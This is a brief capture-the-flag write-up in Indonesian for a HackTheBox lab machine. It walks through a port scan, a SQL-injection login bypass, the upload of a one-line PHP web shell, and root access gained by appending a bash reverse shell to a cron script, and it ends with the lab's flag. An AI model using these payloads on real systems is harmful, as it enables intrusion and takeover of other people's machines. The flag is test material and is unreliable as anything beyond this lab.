# 👀 HTB: Monitored

## 📡 Nmap Scan

```bash
nmap -sC -sV -p- -oN nmap-initial.txt 10.10.11.148
```
→ Menemukan port:

- 80 (Apache)
- 443 (HTTPS dengan TLS self-signed)


## 🔍 Web Enumeration

- Website memuat dashboard monitoring dengan login.
- SQL Injection ditemukan di form login:
```sql
' OR 1=1 --
```
→ Login bypass berhasil!


## 🕳️ File Upload Abuse

- Upload file `.php` dalam dashboard dan akses shell.
```bash
<?php echo shell_exec($_GET['x']); ?>
```


### 🧠 Privilege Escalation

- Cek `pspy` → ditemukan skrip dijalankan sebagai root secara periodik.
```bash
/home/user/scripts/cleanup.sh
```

→ Tambahkan baris:

```bash
bash -i >& /dev/tcp/10.10.14.99/4444 0>&1
```
→ Reverse shell didapat sebagai root.
Flag: `HTB{r00t_und3r_surv3illance}`